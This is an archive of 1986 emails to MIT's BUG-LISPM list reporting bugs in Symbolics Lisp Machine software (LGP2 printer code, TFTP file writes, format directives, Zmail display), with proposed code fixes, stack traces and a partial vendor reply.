Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 23 Mar 86 21:54-EST
Received: from OTIS.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 26590; Sun 23-Mar-86 21:57:17-EST
Date: Sun, 23 Mar 86 21:54 EST
From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>
Subject: lgp:print-space-nums$ is incorrectly sensitive to value of base and *nopoint  
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860323215426.5.CJL@OTIS.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>V127-LISP.FLOD(2),
FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-INFO.FLOD(2),
FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

was:

(defun print-space-nums$ (stream &rest numbers)
  (dolist (n numbers)
    (princ " " stream)
    (if (or (fixp n) (stringp n))
	(princ n stream)
	(format stream "~$" n)))
  (terpri stream))

should be:

(defun print-space-nums$ (stream &rest numbers)
  (let ((base 10)
	(*nopoint t))
    (dolist (n numbers)
      (princ " " stream)
      (if (or (fixp n) (stringp n))
	  (princ n stream)
	  (format stream "~$" n)))
    (terpri stream)))
23-Mar-86 22:03:34-EST,2300;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 23 Mar 86 22:03-EST
Received: from OTIS.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 26592; Sun 23-Mar-86 22:06:53-EST
Date: Sun, 23 Mar 86 22:04 EST
From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>
Subject: lgp:lgp2-download-one-bcd improperly ignores the top-kern of the bcd 
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860323220407.6.CJL@OTIS.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>V127-LISP.FLOD(2),
FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-INFO.FLOD(2),
FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

was:

(defun lgp2-download-one-bcd (stream code bcd baseline)
;; [char-code raster-w raster-h left-kern baseline w-x w-y] DefineBitmapChar <hexbytes...>
  (multiple-value-bind (top bottom+1) (fed:bcd-top-bottom-bounds bcd)
    (cond ((null top)				;no ink
	   (lgp2-download-empty-bcd stream code (fed:bcd-set-width bcd)))
	  (T
	   (format stream "~%[//~a ~d ~d ~d ~d ~d ~d] DefineBitmapChar~%"
		   (aref *bs-encoding* code)
		   (* 8 (ceiling (fed:bcd-raster-width bcd) 8))	;raster-w
		   (- bottom+1 top)		;raster-h
		   (fed:bcd-left-kern bcd)	;left-kern
		   (- baseline bottom+1)	;bottom
		   (fed:bcd-set-width bcd)
		   0)
	   (lgp2-send-raster stream bcd 0 top
			     (* 8 (ceiling (fed:bcd-raster-width bcd) 8))
			     bottom+1)))))

should be:

(defun lgp2-download-one-bcd (stream code bcd baseline)
;; [char-code raster-w raster-h left-kern baseline w-x w-y] DefineBitmapChar <hexbytes...>
  (multiple-value-bind (top bottom+1) (fed:bcd-top-bottom-bounds bcd)
    (cond ((null top)				;no ink
	   (lgp2-download-empty-bcd stream code (fed:bcd-set-width bcd)))
	  (T
	   (format stream "~%[//~a ~d ~d ~d ~d ~d ~d] DefineBitmapChar~%"
		   (aref *bs-encoding* code)
		   (* 8 (ceiling (fed:bcd-raster-width bcd) 8))	;raster-w
		   (- bottom+1 top)		;raster-h
		   (fed:bcd-left-kern bcd)	;left-kern
		   (- (+ baseline (fed:bcd-top-kern bcd)) bottom+1)	;bottom
		   (fed:bcd-set-width bcd)
		   0)
	   (lgp2-send-raster stream bcd 0 top
			     (* 8 (ceiling (fed:bcd-raster-width bcd) 8))
			     bottom+1)))))
23-Mar-86 22:53:11-EST,4064;000000000000
Received: from CHAPIN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 23 Mar 86 22:53-EST
Date: Sun, 23 Mar 86 22:53 EST
From: David M. Siegel <DMS@MIT-HERMES.ARPA>
Subject: tftp file serving doesn't work
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860323225326.2.DMS@CHAPIN.AI.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(1),
FEP0:>v127-loaders.flod(1), FEP0:>v127-info.flod(1),
FEP0:>v127-debug.flod(1), on Lisp Machine Harry Chapin:

The lispm cannot write files to hosts using the tftp protocol. Reading
works fine. From zwie, try saving a file to a host that only supports
tftp file serving to reproduce the problem.

>>Error: File not found
While in the function TCP::TFTP-SIGNAL-ERROR  TCP::TFTP-READ-ACK  (:METHOD TCP::TFTP-FILE-ACCESS-PATH :OPEN)

TCP::TFTP-SIGNAL-ERROR:  (P.C. = 104)
   Arg 0 (TCP::PKT): #<UDP-HEADER 105414025>
   Arg 1 (TCP::START): 8
   Arg 2 (TCP::END): 27
   Local 3 (TCP::MESSAGE): "File not found"

TCP::TFTP-READ-ACK:  (P.C. = 67)
   Arg 0 (TCP::CONN): #<UDP-CONN 30304165>
   Arg 1 (TCP::PKT-NO): 0

(:METHOD TCP::TFTP-FILE-ACCESS-PATH :OPEN):  (P.C. = 216)
   Arg 0 (SELF): #<TFTP-FILE-ACCESS-PATH HERMES using TFTP 30264771>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TCP::TFTP-FILE-ACCESS-PATH -- 1. IV's, 2. FL's 26734201>
   Arg 2 (SI:OPERATION): :OPEN
   Arg 3 (TCP::TRANSLATED): #<UNIX42-PATHNAME "HERMES: //u//dms//foo.bar">
   Arg 4 (TCP::PATHNAME): #<UNIX42-PATHNAME "HERMES: //u//dms//foo.bar">
   Rest arg: (:CHARACTERS T :DIRECTION :OUTPUT)

(:METHOD FS:ACTIVE-PATHNAME-MIXIN :OPEN):  (P.C. = 14)
   Arg 0 (SELF): #<UNIX42-PATHNAME "HERMES: //u//dms//foo.bar">
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:ACTIVE-PATHNAME-MIXIN -- 1. IV's, 0. FL's 121146543>
   Arg 2 (SI:OPERATION): :OPEN
   Arg 3 (FS:PATHNAME): #<UNIX42-PATHNAME "HERMES: //u//dms//foo.bar">
   Rest arg (FS:OPTIONS): (:CHARACTERS T :DIRECTION :OUTPUT)

FS:MACLISP-COMPATIBILITY-OPEN:  (P.C. = 365)
   Arg 0 (FS:FILENAME): #<UNIX42-PATHNAME "HERMES: //u//dms//foo.bar">
   Arg 1 (FS:OPTIONS): (ZWEI:OUT)

OPEN:  (P.C. = 254)
   Arg 0 (FS:PATHNAME): #<UNIX42-PATHNAME "HERMES: //u//dms//foo.bar">
   Rest arg (FS:KEYWORD-ARGS): ((ZWEI:OUT))

(:METHOD ZWEI:FILE-BUFFER-MIXIN :SAVE):  (P.C. = 46)
   Arg 0 (SELF): #<FILE-BUFFER "foo.bar //u//dms// HERMES:" 116400770>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:FILE-BUFFER-MIXIN -- 9. IV's, 0. FL's 170424075>
   Arg 2 (SI:OPERATION): :SAVE

ZWEI:SAVE-BUFFER:  (P.C. = 203)
   Arg 0 (ZWEI:BUFFER): #<FILE-BUFFER "foo.bar //u//dms// HERMES:" 116400770>

ZWEI:COM-WRITE-FILE:  (P.C. = 20)

ZWEI:COMMAND-EXECUTE:  (P.C. = 57)
   Arg 0 (ZWEI:COMMAND): ZWEI:COM-WRITE-FILE
   Arg 1 (ZWEI:CHAR): 343
   Arg 2 (ZWEI:PREFIX-CHAR): 344
   --Defaulted args:--
   Arg 3 (ZWEI:HOOK-LIST): NIL

ZWEI:MAKE-EXTENDED-COMMAND-INTERNAL:  (P.C. = 112)

Closure of ZWEI:MAKE-EXTENDED-COMMAND-INTERNAL:

ZWEI:COMMAND-EXECUTE:  (P.C. = 57)
   Arg 0 (ZWEI:COMMAND): #<DTP-CLOSURE 133251231>
   Arg 1 (ZWEI:CHAR): 344
   Arg 2 (ZWEI:PREFIX-CHAR): NIL
   Arg 3 (ZWEI:HOOK-LIST): NIL

ZWEI:PROCESS-COMMAND-CHAR:  (P.C. = 14)
   Arg 0 (ZWEI:CH): 344

(:METHOD ZWEI:EDITOR :EDIT):  (P.C. = 233)
   Arg 0 (SELF): #<ZMACS-TOP-LEVEL-EDITOR 144776776>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:EDITOR -- 12. IV's, 0. FL's 120377766>
   Arg 2 (SI:OPERATION): :EDIT
   --Defaulted args:--
   Arg 3 (ZWEI:TOP-LEVEL-P): T
   Arg 4 (ZWEI:DESCRIPTION): NIL

(:METHOD ZWEI:TOP-LEVEL-EDITOR :COMBINED :EDIT):  (P.C. = 60)
   Arg 0 (SELF): #<ZMACS-TOP-LEVEL-EDITOR 144776776>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:TOP-LEVEL-EDITOR -- 13. IV's, 1. FL's 120377366>
   Arg 2 (SI:.OPERATION.): :EDIT
   Rest arg (SI:.DAEMON-CALLER-ARGS.): NIL

ZWEI:ZMACS-WINDOW-TOP-LEVEL:  (P.C. = 51)

SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
   Arg 0 (IGNORE): NIL
24-Mar-86 16:39:43-EST,771;000000000000
Received: from JANIS.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 24 Mar 86 16:39-EST
Date: Mon, 24 Mar 86 16:39 EST
From: David Chapman <Zvona@OZ.AI.MIT.EDU>
Subject: ~t with 0 arg broken
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860324163913.2.ZVONA@JANIS.AI.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.12,
AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
Experimental CGL 34.0, microcode TMC5-COL-MIC 353, FEP 127,
FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Janis Joplin:

(format t "~&~0tFOO") types a space before the FOO.

Obviously, you would not write such a format string, but

(format t "~&~vt~s" foo bar)

where foo => 0 is plausible.
24-Mar-86 18:57:58-EST,3512;000000000000
Received: from DUE-PROCESS.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 24 Mar 86 18:57-EST
Date: Mon, 24 Mar 86 14:21 EST
From: Carl Hewitt <Hewitt@MIT-XX.ARPA>
Subject: bug in zmail dispaly
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860324142125.2.HEWITT@DUE-PROCESS.AI.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
AISite 13.5, Macsyma 310.35, microcode TMC5-MIC 336, FEP 127,
FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Due Process:

Zmail got confused in displaying a message.

>>Error: WINDOW-START-BP is not in the interval being displayed
While in the function ZWEI:REDISPLAY  ZWEI:REDISPLAY-ALL-WINDOWS  (:METHOD ZWEI:ZMAIL-COMMAND-LOOP-MIXIN-WITH-SUMMARY :REDISPLAY)

ZWEI:REDISPLAY:  (P.C. = 1015)
   Arg 0 (ZWEI:WINDOW): #<WINDOW 145355460>
   --Defaulted args:--
   Arg 1 (ZWEI:RECENTER-TYPE): :POINT
   Arg 2 (ZWEI:RC1): NIL
   Arg 3 (ZWEI:RC2): NIL
   Arg 4 (ZWEI:FORCE-TO-COMPLETION-P): NIL
   Local 5 (ZWEI:N-PLINES): 41
   Local 6 (ZWEI:POINT): ("/"Do Sports/" is a popular athletic club, and many foreigners recall the" 0 :NORMAL)
   Local 7 (ZWEI:SHEET): #<ZMAIL-WINDOW Zmail Window 7 43207614 exposed>
   Local 8 (ZWEI:DEGREE): 4
   Local 9 (ZWEI:POINT-BLINKER): #<RECTANGULAR-BLINKER 113500654>
   Local 10 (ZWEI:INTERVAL): #<ZMAIL-INTERVAL "Message" 145356255>
   Local 11 (ZWEI:START-BP): ("/"Do Sports/" is a popular athletic club, and many foreigners recall the" 0 :NORMAL)
   Local 12 (ZWEI:NOW): 261707
   Local 13 (ZWEI:POINT-PLINE): NIL
   Local 14 (ZWEI:LH): 14
   Local 15 (ZWEI:POINT-LINE): "/"Do Sports/" is a popular athletic club, and many foreigners recall the"
   Local 16 (ZWEI:POINT-INDEX): 0
   Local 17 (ZWEI:TOP-LINE): "/"Do Sports/" is a popular athletic club, and many foreigners recall the"
   Local 18 (ZWEI:TOP-INDEX): 0
   Local 19 (ZWEI:LAST-BP): ("" 0 :MOVES)
   Local 20 (ZWEI:INITIAL-DEGREE): 4
   Local 21: #<ZMAIL-INTERVAL "Message" 145356255>
   Local 22 (ZWEI:LINE): "/"Do Sports/" is a popular athletic club, and many foreigners recall the"
   Local 23 (ZWEI:FROM-INDEX): 0
   Local 24 (ZWEI:TO-INDEX): NIL
   Local 25 (ZWEI:PLINE): 0
   Local 26 (ZWEI:STOP-LINE): ""

ZWEI:REDISPLAY-ALL-WINDOWS:  (P.C. = 34)
   --Defaulted args:--
   Arg 0 (ZWEI:FORCE-TO-COMPLETION-P): NIL
   Arg 1 (ZWEI:SELECT-P): T

(:METHOD ZWEI:ZMAIL-COMMAND-LOOP-MIXIN-WITH-SUMMARY :REDISPLAY):  (P.C. = 3)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-COMMAND-LOOP-MIXIN-WITH-SUMMARY -- 1. IV's, 0. FL's 120412223>
   Arg 2 (SI:OPERATION): :REDISPLAY

(:METHOD ZWEI:ZMAIL-FRAME :COMMAND-LOOP):  (P.C. = 120)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-FRAME -- 66. IV's, 20. FL's 146565661>
   Arg 2 (SI:OPERATION): :COMMAND-LOOP

(:METHOD ZWEI:ZMAIL-FRAME :COMBINED :COMMAND-LOOP):  (P.C. = 70)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-FRAME -- 66. IV's, 20. FL's 146565661>
   Arg 2 (SI:.OPERATION.): :COMMAND-LOOP
   Rest arg (SI:.DAEMON-CALLER-ARGS.): NIL

ZWEI:ZMAIL-PROCESS-TOP-LEVEL:  (P.C. = 105)
   Arg 0 (ZWEI:WINDOW): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>

SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
   --Defaulted args:--
   Arg 0 (IGNORE): NIL
26-Mar-86 22:39:25-EST,4092;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 26 Mar 86 22:39-EST
Received: from OTIS.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 27107; Wed 26-Mar-86 18:09:34-EST
Date: Wed, 26 Mar 86 18:09 EST
From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>
Subject: lgp2-printer doesn't handle :pixel units
To: bug-lispm@OZ.AI.MIT.EDU
Message-ID: <860326180923.4.CJL@OTIS.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>V127-LISP.FLOD(2),
FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-INFO.FLOD(2),
FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

Apparently one cannot send a lgp2-printer the :convert-from-device-units
message, with :pixel as an argument. Release 6.1 patch notes, page 143,
says one can.

>>Error: The object #<LGP2-PAGE-BUFFERING-STREAM 17272272> received a :DEVICE-UNITS-TO-PIXELS message, which went unclaimed.
         The rest of the message was (72.0 :HORIZONTAL)
While in the function (:METHOD SI:BASIC-HARDCOPY-STREAM :CONVERT-FROM-DEVICE-UNITS)  (:DEFUN-METHOD DVI:DEVICE-DPI)  (:DEFUN-METHOD DVI:COMPUTE-SCALE)

SI:INSTANCE-HASH-UNCLAIMED-MESSAGE:  (P.C. = 35)
   Arg 0 (SELF): #<LGP2-PAGE-BUFFERING-STREAM 17272272>
   Arg 1 (SYS:SELF-MAPPING-TABLE): NIL
   Rest arg (SI:MESSAGE): (:DEVICE-UNITS-TO-PIXELS 72.0 :HORIZONTAL)
   Local 3 (SI:FL): #<FLAVOR LGP:LGP2-PAGE-BUFFERING-STREAM 123366702>

(:METHOD SI:BASIC-HARDCOPY-STREAM :CONVERT-FROM-DEVICE-UNITS):  (P.C. = 63)
   Arg 0 (SELF): #<LGP2-PAGE-BUFFERING-STREAM 17272272>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor SI:BASIC-HARDCOPY-STREAM -- 27. IV's, 0. FL's 26704506>
   Arg 2 (SI:OPERATION): :CONVERT-FROM-DEVICE-UNITS
   Arg 3 (SI:QUAN): 72.0
   Arg 4 (SI:UNITS): :PIXEL
   Arg 5 (SI:DIRECTION): :HORIZONTAL

(:DEFUN-METHOD DVI:DEVICE-DPI):  (P.C. = 14)  (from B:>aisite>dvi-stream)
   Arg 0 (SELF): #<DVI-HARDCOPY-INPUT-FILTER 17272133>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor DVI:DVI-HARDCOPY-INPUT-FILTER -- 32. IV's, 0. FL's 26704453>

(:DEFUN-METHOD DVI:COMPUTE-SCALE):  (P.C. = 37)  (from B:>aisite>dvi-stream)
   Arg 0 (SELF): #<DVI-HARDCOPY-INPUT-FILTER 17272133>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor DVI:DVI-HARDCOPY-INPUT-FILTER -- 32. IV's, 0. FL's 26704453>

(:METHOD DVI:DVI-HARDCOPY-INPUT-FILTER :PROCESS-INPUT-FILE):  (P.C. = 26)  (from B:>aisite>dvi-stream)
   Arg 0 (SELF): #<DVI-HARDCOPY-INPUT-FILTER 17272133>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor DVI:DVI-HARDCOPY-INPUT-FILTER -- 32. IV's, 0. FL's 26704453>
   Arg 2 (SI:OPERATION): :PROCESS-INPUT-FILE

DVI:HARDCOPY-DVI-STREAM:  (P.C. = 16)  (from B:>aisite>dvi-stream)
   Arg 0 (DVI:STREAM): #<FILE-INPUT-BINARY-STREAM "PREP: //u//cjl//two.dvi" 17272113>
   Arg 1 (DVI:DEVICE): #<LGP2-PRINTER LE-MONDE 43302510>
   Rest arg (DVI:OPTIONS): NIL

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (DVI:HARDCOPY-DVI-STREAM STREAM SI:*DEFAULT-HARDCOPY-DEVICE*)
   Local 0 (SI:FORM): NIL
   Arg 1 (SI:ENV): (((STREAM #<FILE-INPUT-BINARY-STREAM "PREP: //u//cjl//two.dvi" 17272113>) (SI:.STREAM-ABORT-FLAG. :ABORT)) NIL NIL NIL NIL NIL NIL)
   --Defaulted args:--
   Arg 2 (SI:HOOK): NIL

PROGN:  (P.C. = 20)
   Arg 0 (SI:.FORM.): (PROGN (DVI:HARDCOPY-DVI-STREAM STREAM SI:*DEFAULT-HARDCOPY-DEVICE*))
   Arg 1 (SI:ENV): (((STREAM #<FILE-INPUT-BINARY-STREAM "PREP: //u//cjl//two.dvi" 17272113>) (SI:.STREAM-ABORT-FLAG. :ABORT)) NIL NIL NIL NIL NIL NIL)

Rest of stack:
SI:*EVAL:  (P.C. = 163)
MULTIPLE-VALUE-PROG1:  (P.C. = 26)
SI:*EVAL:  (P.C. = 163)
UNWIND-PROTECT:  (P.C. = 22)
SI:*EVAL:  (P.C. = 163)
SI:DIGESTED-LET:  (P.C. = 236)
SI:DIGEST-INTERNAL:  (P.C. = 30)
LET:  (P.C. = 37)
SI:*EVAL:  (P.C. = 163)
(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0.):  (P.C. = 152)
TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
SI:LISP-COMMAND-LOOP:  (P.C. = 67)
SI:LISP-TOP-LEVEL1:  (P.C. = 5)
SI:LISP-TOP-LEVEL:  (P.C. = 7)
-------
26-Mar-86 22:40:02-EST,999;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 26 Mar 86 22:39-EST
Received: from OTIS.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 27108; Wed 26-Mar-86 18:11:37-EST
Date: Wed, 26 Mar 86 18:11 EST
From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>
Subject: lgp2's should somehow be able to be forced to use a particular bfd
To: bug-lispm@OZ.AI.MIT.EDU
Message-ID: <860326181126.5.CJL@OTIS.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>V127-LISP.FLOD(2),
FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-INFO.FLOD(2),
FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

lgp:canonicalize-lgp2-font should accept a symbol in the fonts package,
that has a fed:bfont-descriptor property of a bfd, or at least a bfd
itself, and to use that bfd as the downloadable font.

I want to be able to say "Use this bfd, don't try to be smart".

26-Mar-86 22:41:14-EST,1994;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 26 Mar 86 22:41-EST
Received: from OTIS.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 27203; Wed 26-Mar-86 22:37:48-EST
Date: Wed, 26 Mar 86 22:37 EST
From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>
Subject: More about lgp2 printers
To: bug-lispm@OZ.AI.MIT.EDU
Message-ID: <860326223744.1.CJL@OTIS.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>V127-LISP.FLOD(2),
FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-INFO.FLOD(2),
FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

Currently, the lgp2 printer software doesn't show characters that have
char-codes less than 40 octal. Why not? I think it should.

Here's what the code is now.

(defmethod (postscript-output-stream :show-char) (char)
  (cond (( (char-code char) #o200)
	 (send self :force-string)
	 (format si:output-stream " ~d ns~%" (char-code char))
	 (incf si:device-cursor-x (send self ':character-width char)))
	((< (char-code char) #o40)
	 ;;Ignore
	 )					
	(T (when (and *force-string-uses-show* (string-search-char char "\()"))
	     (array-push-extend char-string #/\))
	   (array-push-extend char-string char)
	   (incf si:device-cursor-x (send self ':character-width char))
	   (setq char-string-in-use T))))

Why not make it something like this?

(defmethod (postscript-output-stream :show-char) (char)
  (cond ((or ( (char-code char) #o200) (< (char-code char) #o40))
	 (send self :force-string)
	 (format si:output-stream " ~d ns~%" (char-code char))
	 (incf si:device-cursor-x (send self ':character-width char)))
	(T (when (and *force-string-uses-show* (string-search-char char "\()"))
	     (array-push-extend char-string #/\))
	   (array-push-extend char-string char)
	   (incf si:device-cursor-x (send self ':character-width char))
	   (setq char-string-in-use T))))
27-Mar-86 05:31:39-EST,5145;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 27 Mar 86 05:31-EST
Received: from SCRC-RIVERSIDE.ARPA by MC.LCS.MIT.EDU 27 Mar 86 05:33:49 EST
Received: from SWALLOW.SCRC.Symbolics.COM by SCRC-RIVERSIDE.ARPA via CHAOS with CHAOS-MAIL id 80209; Thu 27-Mar-86 05:30:56-EST
Date: Thu, 27 Mar 86 05:29 EST
From: Michael Greenwald <Greenwald@SCRC-STONY-BROOK.ARPA>
Subject: tftp file serving doesn't work
To: DMS@MIT-HERMES.ARPA, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860323225326.2.DMS@CHAPIN.AI.MIT.EDU>
Message-ID: <860327052916.5.GREENWALD@SWALLOW.SCRC.Symbolics.COM>

    Date: Sun, 23 Mar 86 22:53 EST
    From: David M. Siegel <DMS@MIT-HERMES.ARPA>

    In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
    AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
    microcode TMC5-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(1),
    FEP0:>v127-loaders.flod(1), FEP0:>v127-info.flod(1),
    FEP0:>v127-debug.flod(1), on Lisp Machine Harry Chapin:

    The lispm cannot write files to hosts using the tftp protocol. Reading
    works fine. From zwie, try saving a file to a host that only supports
    tftp file serving to reproduce the problem.

As far as I can tell, the problem is with Hermes.  Trying the same
operation (tftp -p /.login mit-hermes /tmp/foo) from a VAX at MIT
produced the same result.   (An error packet saying "File not found.")

Check with Hermes' maintainers on the state of their TFTP
implementation.  I believe that Milo, Opus, Comet, Borax, and company
all have (relatively) correctly working TFTP's.

    >>Error: File not found
    While in the function TCP::TFTP-SIGNAL-ERROR  TCP::TFTP-READ-ACK  (:METHOD TCP::TFTP-FILE-ACCESS-PATH :OPEN)

    TCP::TFTP-SIGNAL-ERROR:  (P.C. = 104)
       Arg 0 (TCP::PKT): #<UDP-HEADER 105414025>
       Arg 1 (TCP::START): 8
       Arg 2 (TCP::END): 27
       Local 3 (TCP::MESSAGE): "File not found"

    TCP::TFTP-READ-ACK:  (P.C. = 67)
       Arg 0 (TCP::CONN): #<UDP-CONN 30304165>
       Arg 1 (TCP::PKT-NO): 0

    (:METHOD TCP::TFTP-FILE-ACCESS-PATH :OPEN):  (P.C. = 216)
       Arg 0 (SELF): #<TFTP-FILE-ACCESS-PATH HERMES using TFTP 30264771>
       Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TCP::TFTP-FILE-ACCESS-PATH -- 1. IV's, 2. FL's 26734201>
       Arg 2 (SI:OPERATION): :OPEN
       Arg 3 (TCP::TRANSLATED): #<UNIX42-PATHNAME "HERMES: //u//dms//foo.bar">
       Arg 4 (TCP::PATHNAME): #<UNIX42-PATHNAME "HERMES: //u//dms//foo.bar">
       Rest arg: (:CHARACTERS T :DIRECTION :OUTPUT)

    (:METHOD FS:ACTIVE-PATHNAME-MIXIN :OPEN):  (P.C. = 14)
       Arg 0 (SELF): #<UNIX42-PATHNAME "HERMES: //u//dms//foo.bar">
       Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:ACTIVE-PATHNAME-MIXIN -- 1. IV's, 0. FL's 121146543>
       Arg 2 (SI:OPERATION): :OPEN
       Arg 3 (FS:PATHNAME): #<UNIX42-PATHNAME "HERMES: //u//dms//foo.bar">
       Rest arg (FS:OPTIONS): (:CHARACTERS T :DIRECTION :OUTPUT)

    FS:MACLISP-COMPATIBILITY-OPEN:  (P.C. = 365)
       Arg 0 (FS:FILENAME): #<UNIX42-PATHNAME "HERMES: //u//dms//foo.bar">
       Arg 1 (FS:OPTIONS): (ZWEI:OUT)

    OPEN:  (P.C. = 254)
       Arg 0 (FS:PATHNAME): #<UNIX42-PATHNAME "HERMES: //u//dms//foo.bar">
       Rest arg (FS:KEYWORD-ARGS): ((ZWEI:OUT))

    (:METHOD ZWEI:FILE-BUFFER-MIXIN :SAVE):  (P.C. = 46)
       Arg 0 (SELF): #<FILE-BUFFER "foo.bar //u//dms// HERMES:" 116400770>
       Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:FILE-BUFFER-MIXIN -- 9. IV's, 0. FL's 170424075>
       Arg 2 (SI:OPERATION): :SAVE

    ZWEI:SAVE-BUFFER:  (P.C. = 203)
       Arg 0 (ZWEI:BUFFER): #<FILE-BUFFER "foo.bar //u//dms// HERMES:" 116400770>

    ZWEI:COM-WRITE-FILE:  (P.C. = 20)

    ZWEI:COMMAND-EXECUTE:  (P.C. = 57)
       Arg 0 (ZWEI:COMMAND): ZWEI:COM-WRITE-FILE
       Arg 1 (ZWEI:CHAR): 343
       Arg 2 (ZWEI:PREFIX-CHAR): 344
       --Defaulted args:--
       Arg 3 (ZWEI:HOOK-LIST): NIL

    ZWEI:MAKE-EXTENDED-COMMAND-INTERNAL:  (P.C. = 112)

    Closure of ZWEI:MAKE-EXTENDED-COMMAND-INTERNAL:

    ZWEI:COMMAND-EXECUTE:  (P.C. = 57)
       Arg 0 (ZWEI:COMMAND): #<DTP-CLOSURE 133251231>
